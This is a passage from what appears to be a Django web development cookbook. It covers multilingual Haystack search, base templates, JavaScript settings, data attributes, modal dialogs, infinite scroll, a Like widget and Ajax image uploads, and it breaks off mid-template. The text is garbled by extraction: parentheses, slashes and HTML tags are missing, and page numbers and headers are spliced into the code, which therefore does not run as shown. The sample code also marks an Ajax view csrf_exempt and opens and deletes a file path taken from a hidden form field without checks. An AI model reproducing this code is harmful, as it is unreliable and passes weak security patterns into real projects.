"default_lt": {         "ENGINE": "search.multilingual_whoosh_backend."\             "MultilingualWhooshEngine",         "PATH": os.path.join PROJECT_PATH, "myproject",             "tmp", "whoosh_index_lt" ,     }, }  4.  Now, we need to define the URL rules for the search view:   myproject urls.py  -*- coding: UTF-8 -*- from django.conf.urls import patterns, include, url from django.core.urlresolvers import reverse_lazy from django.utils.translation import string_concat from django.utils.translation import ugettext_lazy as _ from django.conf.urls.i18n import i18n_patterns  from crispy_forms.helper import FormHelper from crispy_forms import layout, bootstrap from haystack.views import SearchView  class CrispySearchView SearchView :     def extra_context self :         helper = FormHelper           helper.form_tag = False         helper.disable_csrf = True         return {"search_helper": helper}  urlpatterns = i18n_patterns '',      …     url r'^search $', CrispySearchView  ,  255  Chapter 3           name='haystack_search' ,      …    5.  Then, here comes the template for the search form and search results, as shown in   the following: { templates search search.html } {% extends "base.html" %} {% load i18n crispy_forms_tags utility_tags %}  {% block content %}      {% trans "Search" %}                              {% crispy form search_helper %}                               <input class="btn btn-primary" type="submit"  value="Search">                                    {% if query %}          {% trans "Results" %}           {% for result in page.object_list %}                                                     {{ result.object.title }}                                         {% empty %}              {% trans "No results found." %}          {% endfor %}          {% if page.has_previous or page.has_next %}                                                                               {% if page.has_previous %}<a href="{%  modify_query page=page.previous_page_number %}">{% endif %}  256  Forms and Views                                &laquo;<  span>                         {% if page.has_previous %} {% endif %}                                                                     {% if page.has_next %}<a href="{% modify_ query page=page.next_page_number %}">{% endif %}                              &raquo;<  span>                         {% if page.has_next %} {% endif %}                                                               {% endif %}     {% endif %} {% endblock %}  6.  Call the rebuild_index management command in order to index the database   data and prepare the full-text search to be used:  myproject_env $ python manage.py rebuild_index --noinput  How it works… The MultilingualWhooshEngine specifies two custom properties: backend and  query. The custom MultilingualWhooshSearchBackend backend ensures that, for  each language, the items will be indexed just in that language and put under the specific  Haystack index location that is defined in the HAYSTACK_CONNECTIONS setting. The  MultilingualWhooshSearchQuery custom query ensures that when searching for  keywords, the specific Haystack connection of the current language will be used.  Each index has a field text, where full-text from a specific language of a model will be  stored. The model for the index is defined by the get_model   method, QuerySet to index  is defined by the index_queryset   method, and text to search in gets collected in the  prepare_text   method.  257  Chapter 3   As we want to have a nice Bootstrap 3 form, we will be passing FormHelper from django- crispy-forms to the search view. We can do that by overriding the extra_context    method of SearchView. The final search form will look similar to the following:  The easiest way to regularly update the search index is to call the rebuild_index  management command by a cron job every night. To learn about it, check the Setting up cron  jobs for regular tasks recipe in Chapter 11, Testing and Deployment.   f The Creating form layout with django-crispy-forms recipe  f The Downloading authorized file recipe  f The Setting up cron jobs for regular tasks recipe in Chapter 11, Testing and Deployment  See also  258  Forms and Views   4  Templates and  JavaScript  In this chapter, we will cover the following topics:   f Arranging the base.html template  f Including JavaScript settings  f Using HTML5 data attributes  f Opening object details in a modal dialog  f Implementing a continuous scroll  f Implementing the Like widget  f Uploading images by Ajax  Introduction We are living in the Web2.0 world, where social web applications and smart websites  communicate between servers and clients using Ajax, refreshing whole pages only when the  context changes. In this chapter, you will learn best practices to deal with JavaScript in your  templates in order to create a rich user experience. For responsive layouts, we will use the  Bootstrap 3 frontend framework. For productive scripting, we will use the jQuery JavaScript  framework.  259   Arranging the base.html template When you start working on templates, one of the first actions is to create the base.html  boilerplate, which will be extended by most of the page templates in your project. In this  recipe, we will demonstrate how to create such template for multilingual HTML5 websites   with responsiveness in mind.  Responsive websites are the ones that adapt to the viewport of  the device whether the visitor uses desktop browsers, tablets,  or phones.  Getting ready Create the templates directory in your project and set TEMPLATE_DIRS in the settings.  How to do it… Perform the following steps:  1.   In the root directory of your templates, create a base.html file with the  following  content: { templates base.html }   {% load i18n %}               <meta name="viewport" content="width=device-width, initial- scale=1"  >      {% block title %}{% endblock %}{% trans "My Website"  %}      <link rel="icon" href="{{ STATIC_URL }}site img favicon.ico"  type="image png"  >         {% block meta_tags %}{% endblock %}         {% block base_stylesheet %}         <link rel="stylesheet" href="https:  maxcdn.bootstrapcdn. com bootstrap 3.3.5 css bootstrap.min.css"  >         <link href="{{ STATIC_URL }}site css style.css"  rel="stylesheet" media="screen" type="text css"  >     {% endblock %}  260  Templates and JavaScript       {% block stylesheet %}{% endblock %}         {% block base_js %}          <  script>         <script src="  code.jquery.com jquery-migrate-1.2.1.min. js">          <script src="https:  maxcdn.bootstrapcdn.com  bootstrap 3.3.5 js bootstrap.min.js">                 {% endblock %}         {% block js %}{% endblock %}     {% block extrahead %}{% endblock %}         {% block page %}                                          {% trans "My Website" %}                  {% block header_navigation %}                     {% include "utils header_navigation.html" %}                 {% endblock %}                 {% block language_chooser %}                     {% include "utils language_chooser.html" %}                 {% endblock %}                                             {% block content %}                 {% endblock %}                                              {% block footer_navigation %}                     {% include "utils footer_navigation.html" %}                 {% endblock %}                             {% endblock %}     {% block extrabody %}{% endblock %}      261  Chapter 4   2.   In the same directory, create another file named base_simple.html for specific  cases, as follows: { templates base_simple.html } {% extends "base.html" %}  {% block page %}                             {% block content %}             {% endblock %}                 {% endblock %}  How it works… The base template contains the   and   sections of the HTML document with  all the details that are reused on each page of the website. Depending on the web design  requirements, you can have additional base templates for different layouts. For example, we  added the base_simple.html file, which has the same HTML   section and a very  minimalistic   section; and it can be used for the login screen, password reset, or other  simple pages. You can have separate base templates for single-column, two-column, and  three-column layouts, where each of them extends base.html and overwrites the content of  the   section.  Let's look into the details of the base.html template that we defined earlier.  In the   section, we define UTF-8 as the default encoding to support multilingual  content. Then, we have the viewport definition that will scale the website in the browser  in order to use the full width. This is necessary for small-screen devices that will get  specific screen layouts created with the Bootstrap frontend framework. Of course, there is  a customizable website title and the favicon will be shown in the browser's tab. We have  extendable blocks for meta tags, style sheets, JavaScript, and whatever else that might be  necessary for the   section. Note that we load the Bootstrap CSS and JavaScript in  the template as we want to have responsive layouts and basic solid predefined styles for all  elements. Then, we load the JavaScript jQuery library that efficiently and flexibly allows us  to create rich user experiences. We also load JavaScript settings that are rendered from a  Django view. You will learn about this in the next recipe.  In the   section, we have the header with an overwritable navigation and a language  chooser. We also have the content block and footer. At the very bottom, there is an extendable  block for additional markup or JavaScript.  262  Templates and JavaScript   The base template that we created is, by no means, a static unchangeable template. You can  add to it the elements that you need, for example, Google Analytics code, common JavaScript  files, the Apple touch icon for iPhone bookmarks, Open Graph meta tags, Twitter Card tags,  schema.org attributes, and so on.  See also   f The Including JavaScript settings recipe  Including JavaScript settings Each Django project has its configuration set in the conf base.py or settings.py  settings file. Some of these configuration values also need to be set in JavaScript. As we  want a single location to define our project settings, and we don't want to repeat the process  when setting the configuration for the JavaScript values, it is a good practice to include a  dynamically generated configuration file in the base template. In this recipe, we will see how to  do that.  Getting ready Make sure that you have the media, static, and request context processors set in the  TEMPLATE_CONTEXT_PROCESSORS setting, as follows:   conf base.py or settings.py TEMPLATE_CONTEXT_PROCESSORS =       "django.contrib.auth.context_processors.auth",     "django.core.context_processors.debug",     "django.core.context_processors.i18n",     "django.core.context_processors.media",     "django.core.context_processors.static",     "django.core.context_processors.tz",     "django.contrib.messages.context_processors.messages",     "django.core.context_processors.request",    Also, create the utils app if you haven't done so already and place it under INSTALLED_ APPS in the settings.  263  Chapter 4   How to do it… Follow these steps to create and include the JavaScript settings:  1.  Create a URL rule to call a view that renders JavaScript settings, as follows:   urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import patterns, include, url from django.conf.urls.i18n import i18n_patterns  urlpatterns = i18n_patterns "",      …     url r"^js-settings $", "utils.views.render_js",         {"template_name": "settings.js"},         name="js_settings",      ,    2.   In the views of your utils app, create the render_js   view that returns a  response of the JavaScript content type, as shown in the following:  utils views.py  -*- coding: utf-8 -*- from __future__ import unicode_literals from datetime import datetime, timedelta from django.shortcuts import render from django.views.decorators.cache import cache_control  @cache_control public=True  def render_js request, cache=True, *args, **kwargs :     response = render request, *args, **kwargs      response["Content-Type"] = \         "application javascript; charset=UTF-8"     if cache:         now = datetime.utcnow           response["Last-Modified"] = \             now.strftime "%a, %d %b %Y %H:%M:%S GMT"           cache in the browser for 1 month         expires = now + timedelta days=31           response["Expires"] = \             expires.strftime "%a, %d %b %Y %H:%M:%S GMT"      else:         response["Pragma"] = "No-Cache"     return response  264  Templates and JavaScript   3.  Create a settings.js template that returns JavaScript with the global settings   variable, as follows:  templates settings.js window.settings = {     MEDIA_URL: '{{ MEDIA_URLescapejs }}',     STATIC_URL: '{{ STATIC_URLescapejs }}',     lang: '{{ LANGUAGE_CODEescapejs }}',     languages: { {% for lang_code, lang_name in LANGUAGES %}'{{  lang_codeescapejs }}': '{{ lang_nameescapejs }}'{% if not  forloop.last %},{% endif %} {% endfor %} } };  4.  Finally, if you haven't done it yet, include the rendered JavaScript settings file in the   base template, as shown in the following:  templates base.html     How it works… The Django template system is very flexible; you are not limited to using templates just for  HTML. In this example, we will dynamically create the JavaScript file. You can access it in your  development web server at http:  127.0.0.1:8000 en js-settings  and its content  will be something similar to the following:  window.settings = {     MEDIA_URL: ' media ',     STATIC_URL: ' static 20140424140000 ',     lang: 'en',     languages: { 'en': 'English', 'de': 'Deutsch', 'fr': 'Français',  'lt': 'Lietuvi kalba' } };  The view will be cacheable in both server and browser.  If you want to pass more variables to the JavaScript settings, either create a custom view  and pass all the values to the context or create a custom context processor and pass all the  values there. In the latter case, the variables will also be accessed in all the templates of your  project. For example, you might have indicators such as {{ is_mobile }}, {{ is_tablet  }}, and {{ is_desktop }} in your templates, with the user agent string telling whether the  visitor uses a mobile, tablet, or desktop browser.  265  Chapter 4   See also   f The Arranging the base.html template recipe  f The Using HTML5 data attributes recipe  Using HTML5 data attributes When you have dynamic data related to the DOM elements, you need a more efficient way  to pass the values from Django to JavaScript. In this recipe, we will see a way to attach data  from Django to custom HTML5 data attributes and then describe how to read the data from  JavaScript with two practical examples. The first example will be an image that changes its  source, depending on the viewport, so that the smallest version is shown on mobile devices,  the medium-sized version is shown on tablets, and the biggest high-quality image is shown for  the desktop version of the website. The second example will be a Google Map with a marker  at a specified geographical position.  Getting ready To get started, perform the following steps:  1.  Create a locations app with a Location model, which will at least have the title   character field, the slug field for URLs, the small_image, medium_image, and  large_image image fields, and the latitude and longitude floating-point fields.  The term slug comes from newspaper editing and it means a short string  without any special characters; just letters, numbers, underscores, and  hyphens. Slugs are generally used to create unique URLs.  2.  Create an administration for this model and enter a sample location. 3.  Lastly, create a detailed view for the location and set the URL rule for it.  1.  As we already have the app created, we will now need the template for the    location detail: { templates locations location_detail.html } {% extends "base.html" %}  How to do it… Perform the following steps:  {% block content %}  266  Templates and JavaScript      {{ location.title }}     <img class="img-full-width"     src="{{ location.small_image.url }}"     data-small-src="{{ location.small_image.url }}"     data-medium-src="{{ location.medium_image.url }}"     data-large-src="{{ location.large_image.url }}"     alt="{{ location.titleescape }}"    >    <div id="map"     data-latitude="{{ location.latitudestringformat:"f" }}"     data-longitude="{{ location.longitudestringformat:"f" }}"   >  {% endblock %}  {% block extrabody %}    <  script>    <  script> {% endblock %}  2.  Besides the template, we need the JavaScript file that will read out the HTML5 data   attributes and use them accordingly, as follows:   site_static site js location_detail.js jQuery function $  {  function show_best_images   {   $ 'img.img-full-width' .each function   {     var $img = $ this ;     if  $img.width   > 1024  {       $img.attr 'src', $img.data 'large-src'  ;     } else if  $img.width   > 468  {       $img.attr 'src', $img.data 'medium-src'  ;     } else {       $img.attr 'src', $img.data 'small-src'  ;     }   } ; }  function show_map   {  267  Chapter 4     var $map = $ 'map' ;   var latitude = parseFloat $map.data 'latitude'  ;   var longitude = parseFloat $map.data 'longitude'  ;   var latlng = new google.maps.LatLng latitude, longitude ;    var map = new google.maps.Map $map.get 0 , {     zoom: 15,     center: latlng   } ;   var marker = new google.maps.Marker {     position: latlng,     map: map   } ; }show_best_images  ;show_map  ;  $ window .on 'resize', show_best_images ;  } ;  3.  Finally, we need to set some CSS, as shown in the following:   * site_static site css style.css *  img.img-full-width {     width: 100%; } map {     height: 300px; }  268  Templates and JavaScript   How it works… If you open your location detail view in a browser, you will see something similar to the  following in the large window:  269  Chapter 4   If you resize the browser window to 468 pixels or less, the image will change to its smallest  version, as shown in the following:  Let's take a look at the code. In the template, we have an image tag with an img-full- width CSS class and its source is set to the smallest image by default. This image tag also  has data-small-src, data-medium-src, and data-large-src custom attributes. In  the JavaScript, the show_best_images   function is called when the page is loaded or  the window is resized. The function goes through all images with the img-full-width CSS  class and sets appropriate image sources from the custom data attributes, depending on the  current image width.  270  Templates and JavaScript   Then, there is a   element with the map ID and the data-latitude and data- longitude custom attributes in the template. In the JavaScript, a show_map   function is  called when the page is loaded. This function will create a Google Map in the   element.  At first, the custom attributes are read and converted from strings to floating-point values.  Then, the LatLng object is created that, in the next steps, becomes the center of the map  and the geographical position of the marker shown on this map.  See also   f The Including JavaScript settings recipe  f The Opening object details in a modal dialog recipe  f The Inserting a map into a change form recipe in Chapter 6, Model Administration  Opening object details in a modal dialog In this recipe, we will create a list of links to the locations, which when clicked, opens a  Bootstrap 3 modal dialog  we will call it pop up in this recipe  with some information about  the location and the more… link leading to the location detail page. The content for the dialog  will be loaded by Ajax. For visitors without JavaScript, the detail page will open immediately,  without this intermediate step.  Getting ready Let's start with the locations app that we created in the previous recipe.  In the urls.py file, we will have three URL rules; one for the location list, other for the  location detail, and the third one for the dialog, as follows:   locations urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import patterns, url  urlpatterns = patterns "locations.views",     url r"^$", "location_list", name="location_list" ,     url r"^ ?P [^ ]+  $", "location_detail",         name="location_detail" ,     url r"^ ?P [^ ]+  popup $", "location_detail_popup",         name="location_detail_popup" ,    271  Chapter 4   Consequently, there will be three simple views, as shown in the following:   locations views.py from __future__ import unicode_literals  -*- coding: UTF-8 -*- from django.shortcuts import render, get_object_or_404 from .models import Location  def location_list request :   location_list = Location.objects.all     return render request, "locations location_list.html",     {"location_list": location_list}   def location_detail request, slug :   location = get_object_or_404 Location, slug=slug    return render request, "locations location_detail.html",     {"location": location}   def location_detail_popup request, slug :   location = get_object_or_404 Location, slug=slug    return render request, "locations location_detail_popup.html",     {"location": location}   How to do it… Execute these steps one by one:  1.  Create a template for the location's list view with a hidden empty modal dialog at the   end. Each listed location will have custom HTML5 data attributes dealing with the  pop-up information, as follows: { templates locations location_list.html } {% extends "base.html" %} {% load i18n %}  {% block content %}      {% trans "Locations" %}                {% for location in location_list %}                               <a href="{% url "location_detail" slug=location. slug %}"                 data-popup-url="{% url "location_detail_popup"  slug=location.slug %}"                 data-popup-title="{{ location.titleescape }}">  272  Templates and JavaScript                       {{ location.title }}                                         {% endfor %}       {% endblock %}  {% block extrabody %}                                                                     <button type="button" class="close" data- dismiss="modal" aria-hidden="true">&times;                       Modal title                                                                                           <  script> {% endblock %}  2.  We need JavaScript to handle the opening of the dialog and loading the content   dynamically:    site_static site js location_list.js jQuery function $  {     var $popup = $ 'popup' ;          $ 'body' .on 'click', '.item a', function e  {         e.preventDefault  ;         var $link = $ this ;         var popup_url = $link.data 'popup-url' ;         var popup_title = $link.data 'popup-title' ;          if  !popup_url  {             return true;         }         $ '.modal-title', $popup .html popup_title ;         $ '.modal-body', $popup .load popup_url, function   {             $popup.on 'shown.bs.modal', function    {  273  Chapter 4                      do something when dialog is shown             } .modal "show" ;         } ;          $ '.close', $popup .click function   {                do something when dialog is closing         } ;      } ; } ;  3.  Finally, we will create a template for the content that will be loaded in the modal   dialog, as shown in the following: { templates locations location_detail_popup.html } {% load i18n %}  <img src="{{ location.small_image.url }}" alt="{{ location. titleescape }}"  >         <a href="{% url "location_detail" slug=location.slug %}"     class="btn btn-default pull-right">         {% trans "More" %}                     274  Templates and JavaScript   How it works… If we go to the location's list view in a browser and click on one of the locations, we will see a  modal dialog similar to the following:  How does this work? In the template, there is a   element with the item CSS class and  a link for each location. The links have the data-popup-url and data-popup-title  custom attributes. In the JavaScript, when the page is loaded, we assign an onclick handler  for the   tag. The handler checks if any link inside the tag with the item CSS class  was clicked. For each such clicked link the custom attributes are read as popup_url  and  popup_title, the new title is set for the hidden dialog box, the content is loaded in the  modal dialog using Ajax, and then it is shown to the visitor.  275  Chapter 4   See also   f The Using HTML5 data attributes recipe  f The Implementing a continuous scroll recipe  f The Implementing the Like widget recipe  Implementing a continuous scroll Social websites often have the feature of continuous scrolling, which is also known as infinite  scrolling. There are long lists of items and as you scroll the page down, new items are loaded  and attached to the bottom automatically. In this recipe, we will see how to achieve such an  effect with Django and the jScroll jQuery plugin. We'll illustrate this using a sample view showing  the top 250 movies of all time from Internet Movie Database  http:  www.imdb.com  .  Getting ready First, download the jScroll plugin from the following link: https:  github.com  pklauzinski jscroll.  Put the jquery.jscroll.js and jquery.jscroll.min.js files from the package in the  myproject site_static site js  directory.  Next, for this example, you will create a movies app with a paginated list view for the movies.  You can either create a Movie model or a list of dictionaries with the movie data. Every movie  will have rank, title, release year, and rating fields.  How to do it… Perform the following steps to create an continuously scrolling page:  1.  The first step is to create a template for the list view that will also show a link to the   next page, as follows: { templates movies movie_list.html } {% extends "base.html" %} {% load i18n utility_tags %}  {% block content %}      {% trans "Top Movies" %}                {% for movie in object_list %}                                {{ movie.rank }}.  276  Templates and JavaScript                        {{ movie.title }}                       {{ movie.year }}                       {% trans "IMDB rating" %}:  {{ movie.rating }}                                          {% endfor %}         {% if object_list.has_next %}              <a class="next_page" href="{%  modify_query page=object_list.next_page_number %}">{% trans  "More…" %}           {% endif %}       {% endblock %}  {% block extrabody %}      <  script>        {% endblock %}  2.  The second step is to add JavaScript, as shown in the following:     site_static site js list.js jQuery function $  {     $ '.object_list' .jscroll {         loadingHtml: '<img src="' + settings.STATIC_URL + 'site  img loading.gif" alt="Loading"  >',         padding: 100,         pagingSelector: '.pagination',         nextSelector: 'a.next_page:last',         contentSelector: '.item,.pagination'     } ; } ;  How it works… When you open the movie list view in a browser; a predefined number of items, for example,  25, is shown on the page. As you scroll down, an additional 25 items and the next pagination  link are loaded and appended to the item container. Then, the third page of the items is  loaded and attached at the bottom, and this continues until there are no more pages left   to display.  277  Chapter 4   Upon the page load, the   tag in JavaScript that has the object_list CSS class and  contains the items and pagination links will become a jScroll object. The following parameters  define its features:   f loadingHtml: This sets an animated loading indicator shown at the end of the list   when a new page is loading   f padding: This will define that the new page has to be loaded, when there are 100   pixels between the scrolling position and the end of the scrolling area   f pagingSelector: This CSS selector finds the HTML elements that will be hidden in   the browsers with JavaScript switched on   f nextSelector: This CSS selector finds the HTML elements that will be used to read   the URL of the next page   f contentSelector: This CSS selector defines the HTML elements to be taken out of   the loaded content and put in the container  See also   f The Managing paginated lists recipe in Chapter 3, Forms and Views  f The Composing class-based views recipe in Chapter 3, Forms and Views  f The Including JavaScript settings recipe  Implementing the Like widget Nowadays, social websites usually have integrated Facebook, Twitter, and Google+ widgets  to like and share pages. In this recipe, I will guide you through a similar internal liking Django  app that saves all the likes in your database so that you can create specific views based on  the things that are liked on your website. We will create a Like widget with a two-state button  and badge showing the number of total likes. The following are the states:   f Inactive state, where you can click on a button to activate it:  278  Templates and JavaScript    f Active state, where you can click on a button to deactivate it:  The state of the widget will be handled by Ajax calls.  Getting ready First, create a likes app with a Like model, which has a foreign-key relation to the user  that is liking something and a generic relationship to any object in the database. We will use  ObjectRelationMixin, which we defined in the Creating a model mixin to handle generic  relations recipe in Chapter 2, Database Structure. If you don't want to use the mixin, you can  also define a generic relation in the following model yourself:   likes models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.conf import settings from django.utils.encoding import python_2_unicode_compatible from utils.models import CreationModificationDateMixin from utils.models import object_relation_mixin_factory  @python_2_unicode_compatible class Like CreationModificationDateMixin, object_relation_mixin_factory is_required=True  :     user = models.ForeignKey settings.AUTH_USER_MODEL       class Meta:         verbose_name = _ "like"          verbose_name_plural = _ "likes"          ordering =  "-created",       def __str__ self :         return _ u"% user s likes % obj s"  % {             "user": self.user,             "obj": self.content_object,         }  279  Chapter 4   Also, make sure that the request context processor is set in the settings. We also need an  authentication middleware in the settings for the currently logged-in user attached to the request:   conf base.py or settings.py TEMPLATE_CONTEXT_PROCESSORS =        …     "django.core.context_processors.request",   MIDDLEWARE_CLASSES =        …     "django.contrib.auth.middleware.AuthenticationMiddleware",    How to do it… Execute these steps one by one:  1.   In the likes app, create a templatetags directory with an empty __init__.py  file in order to make it a Python module. Then, add the likes_tags.py file, where  we'll define the {% like_widget %} template tag as follows:  likes templatetags likes_tags.py  -*- coding: UTF-8 -*- from django import template from django.contrib.contenttypes.models import ContentType from django.template import loader  from likes.models import Like  register = template.Library     TAGS   @register.tag def like_widget parser, token :     try:         tag_name, for_str, obj = token.split_contents       except ValueError:         raise template.TemplateSyntaxError, \             "%r tag requires a following syntax: " \             "{%% %r for   %%}" %                   token.contents[0], token.contents[0]      return ObjectLikeWidget obj   class ObjectLikeWidget template.Node :  280  Templates and JavaScript       def __init__ self, obj :         self.obj = obj             def render self, context :         obj = template.resolve_variable self.obj, context          ct = ContentType.objects.get_for_model obj                  is_liked_by_user = bool Like.objects.filter              user=context["request"].user,             content_type=ct,             object_id=obj.pk,                            context.push           context["object"] = obj         context["content_type_id"] = ct.pk         context["is_liked_by_user"] = is_liked_by_user         context["count"] = get_likes_count obj                  output = loader.render_to_string              "likes includes like.html", context          context.pop           return output  2.  Also, we'll add a filter in the same file to get the number of likes for a specified object:   FILTERS   @register.filter def get_likes_count obj :     ct = ContentType.objects.get_for_model obj      return Like.objects.filter          content_type=ct,         object_id=obj.pk,      .count    3.   In the URL rules, we need a rule for a view, which will handle the liking and unliking  using Ajax:  likes urls.py  -*- coding: UTF-8 -*- from django.conf.urls import patterns, url  urlpatterns = patterns "likes.views",            url r"^ ?P [^ ]+   ?P [^ ]+  $",  281  Chapter 4           "json_set_like", name="json_set_like" ,    4.  Then, we need to define the view, as shown in the following:   likes views.py  -*- coding: UTF-8 -*- import json from django.http import HttpResponse from django.views.decorators.cache import never_cache from django.contrib.contenttypes.models import ContentType from django.shortcuts import render from django.views.decorators.csrf import csrf_exempt  from .models import Like from .templatetags.likes_tags import get_likes_count  @never_cache @csrf_exempt def json_set_like request, content_type_id, object_id :     """     Sets the object as a favorite for the current user     """     result = {         "success": False,     }     if request.user.is_authenticated   and \     request.method == "POST":         content_type = ContentType.objects.get id=content_type_id          obj = content_type.get_object_for_this_type pk=object_id          like, is_created = Like.objects.get_or_create              content_type=ContentType.objects.get_for_model obj ,             object_id=obj.pk,             user=request.user,                   if not is_created:             like.delete           result = {             "success": True,             "obj": unicode obj ,             "action": is_created and "added" or "removed",             "count": get_likes_count obj ,         }     json_str = json.dumps result, ensure_ascii=False,             encoding="utf8"   282  Templates and JavaScript       return HttpResponse json_str,     mimetype="application json; charset=utf-8"   5.   In the template for the list or detail view of any object, we can add the template  tag for the widget. Let's add the widget to the location detail that we created in the  previous recipes, as follows: { templates locations location_detail.html } {% extends "base.html" %} {% load likes_tags %}  {% block content %}     {% if request.user.is_authenticated %}         {% like_widget for location %}     {% endif %}     { the details of the object go here… } {% endblock %}  {% block extrabody %}        {% endblock %}  6.  Then, we need a template for the widget, as shown in the following:  { templates likes includes like.html } {% load i18n %}       <button type="button" class="like-button btn btn-default {% if  is_liked_by_user %} active{% endif %}"         data-href="{% url "json_set_like" content_type_id=content_ type_id object_id=object.pk %}"         data-like-text="{% trans "Like" %}"         data-unlike-text="{% trans "Unlike" %}"     >         {% if is_liked_by_user %}                            {% trans "Unlike" %}         {% else %}                            {% trans "Like" %}         {% endif %}            {{ count }}     283  Chapter 4   7.  Finally, we create JavaScript to handle the liking and unliking action in the browser,    as follows:    site_static site js likes.js  function $  {     $ document .on 'click', '.like-button', function   {         var $button = $ this ;         var $badge = $button.closest '.like-widget'              .find '.like-badge' ;         $.post $button.data 'href' , function data  {             if  data['action'] == 'added'  {                 $button.addClass 'active' .html  '   ' + $button.data 'unlike-text'                   ;             } else {                 $button.removeClass 'active' .html  '   ' + $button.data 'like-text'                   ;             }             $badge.html data['count'] ;         }, 'json' ;     } ; }  jQuery ;  How it works… For any object in your website, you can put the {% like_widget for object %} template  tag that will check whether the object is already liked and will show an appropriate state. The  data-href, data-like-text, and data-unlike-text custom HTML5 attributes are  in the widget template. The first attribute holds a unique object-specific URL to change the  current state of the widget. The other two attributes hold the translated texts for the widget.  In the JavaScript, liking buttons are recognized by the like button CSS class. A click-event  listener attached to the document watches for the onClick events from each such button  and then posts an Ajax call to the URL that is specified by the data-href attribute. The  specified view accepts two of the parameters, content type and object ID, of the liked object.  The view checks whether Like for the specified object exists, and if it does, the view removes  it; otherwise the Like object is added. As a result, the view returns a JSON response with the  success status, liked object's text representation, the action whether the Like object was  added or removed, and the total number of likes. Depending on the action that is returned,  JavaScript will show an appropriate state for the button.  284  Templates and JavaScript   You can debug the Ajax responses in the Chrome Developer Tools or Firefox Firebug plugin. If  any server errors occur while developing, you will see the error trace back in the preview of the  response, otherwise you will see the returned JSON as shown in the following screenshot:  See also   f The Opening object details in a modal dialog recipe  f The Implementing a continuous scroll recipe  f The Uploading images by Ajax recipe  f The Creating a model mixin to handle generic relations recipe in Chapter 2,    Database Structure   f Chapter 5, Custom Template Filters and Tags  Uploading images by Ajax File uploads using Ajax has become the de facto standard on the web. People want to see  what they have chosen right after selecting a file instead of seeing it after submitting a form.  Also, if the form has validation errors, nobody wants to select the files again; the file should  still be selected in the form with validation errors.  There is a third-party app, django-ajax-uploader, that can be used to upload images with  Ajax. In this recipe, we will see how to do this.  285  Chapter 4   Getting ready Let's start with the quotes app that we created for the Uploading images recipe in Chapter 3,  Forms and Views. We will reuse the model and view; however, we'll create a different form and  template and add JavaScript too.  Install django-crispy-forms and django-ajax-uploader in your local environment  using the following commands:   myproject $ pip install django-crispy-forms   myproject $ pip install ajaxuploader  Don't forget to put these apps in INSTALLED_APPS, as follows:   conf base.py or settings.py INSTALLED_APPS =        …     "quotes",     "crispy_forms",     "ajaxuploader",    How to do it… Let's redefine the form for inspirational quotes using the following steps:  1.  First, we create a layout for the Bootstrap 3 markup. Note that, instead of the   picture image field, we have the hidden picture_path and delete_picture  fields and some markup for the file upload widget:  quotes forms.py  -*- coding: UTF-8 -*- import os from django import forms from django.utils.translation import ugettext_lazy as _ from django.core.files import File from django.conf import settings from crispy_forms.helper import FormHelper from crispy_forms import layout, bootstrap from .models import InspirationQuote  class InspirationQuoteForm forms.ModelForm :     picture_path = forms.CharField          max_length=255,         widget=forms.HiddenInput  ,         required=False,  286  Templates and JavaScript             delete_picture = forms.BooleanField          widget=forms.HiddenInput  ,         required=False,            class Meta:         model = InspirationQuote         fields = ["author", "quote"]      def __init__ self, *args, **kwargs :                 super InspirationQuoteForm, self .\             __init__ *args, **kwargs           self.helper = FormHelper           self.helper.form_action = ""         self.helper.form_method = "POST"          self.helper.layout = layout.Layout              layout.Fieldset                  _ "Quote" ,                 layout.Field "author" ,                 layout.Field "quote", rows=3 ,                                layout.HTML """     {% include "quotes includes image_upload_widget.html" %}                 """ ,                 layout.Field "picture_path" ,  hidden                 layout.Field "delete_picture" ,  hidden              ,             bootstrap.FormActions                  layout.Submit "submit", _ "Save" ,                     css_class="btn btn-primary" ,                          2.  Then, we will overwrite the save method in order to handle the saving of the   inspirational quote, as follows:     def save self, commit=True :         instance = super InspirationQuoteForm, self .\             save commit=True           if self.cleaned_data['delete_picture'] and \             instance.picture:  287  Chapter 4               instance.picture.delete            if self.cleaned_data['picture_path']:             tmp_path = self.cleaned_data['picture_path']             abs_tmp_path = os.path.join                  settings.MEDIA_ROOT, tmp_path               filename = InspirationQuote._meta.\                 get_field 'picture' .upload_to                  instance, tmp_path              instance.picture.save                  filename,                 File open abs_tmp_path, "rb"  ,                 False                            os.remove abs_tmp_path          instance.save           return instance  3.   In addition to the previously defined views in the quotes app, we add the ajax_ uploader view that will handle uploads with Ajax, as shown in the following:  quotes views.py  … from ajaxuploader.views import AjaxFileUploader ajax_uploader = AjaxFileUploader    4.  Then, we set the URL rule for the view, as follows:   quotes urls.py  -*- coding: UTF-8 -*- from django.conf.urls import patterns, url  urlpatterns = patterns "",      …     url r"^ajax-upload $", "quotes.views.ajax_uploader",         name="ajax_uploader" ,    5.  Next, create the image_upload_widget.html template that will be included in the   crispy form: { templates quotes includes image_upload_widget.html } {% load i18n %}          288  Templates and JavaScript           {% if instance.picture %}                       {% endif %}                                    {% trans "Please enable JavaScript to use file  uploader." %}                       {% trans "Available  formats are JPG, GIF, and PNG." %}            6.  Then, it is time to create the template for the form page itself. In the extrabody block,  we will set a translatable_file_uploader_options variable that will deal with  all translatable options for the file uploader, such as the widget template markup,  error messages, and notifications: { templates quotes change_quote.html } {% extends "base.html" %} {% load i18n crispy_forms_tags %}  {% block stylesheet %}     {{ block.super }}     <link rel="stylesheet" href="{{ STATIC_URL }}ajaxuploader css  fileuploader.css"  > {% endblock %}  {% block content %}     {% crispy form %} {% endblock %}  {% block extrabody %}     <script src="{{ STATIC_URL }}ajaxuploader js fileuploader. js">                var translatable_file_uploader_options = {             template: '  {%  trans "Drop image here" %}  ' +                 ' ' +                 ' <span  class="glyphicon glyphicon-upload">   {% trans "Upload  Image" %} ' +  289  Chapter 4                   '&nbsp;<button class="btn btn-danger qq-delete- button">   {% trans  "Delete" %} ' +                 '  ' +             ' ',                template for one item in file list             fileTemplate: ' ' +                 '  ' +                 '  ' +                 '  ' +                 ' {% trans  "Cancel" %} ' +                 ' {% trans  "Failed" %} ' +             ' ',             messages: {                 typeError: '{% trans "{file} has invalid  extension. Only {extensions} are allowed." %}',                 sizeError: '{% trans "{file} is too large, maximum  file size is {sizeLimit}." %}',                 minSizeError: '{% trans "{file} is too small,  minimum file size is {minSizeLimit}." %}',                 emptyError: '{% trans "{file} is empty, please  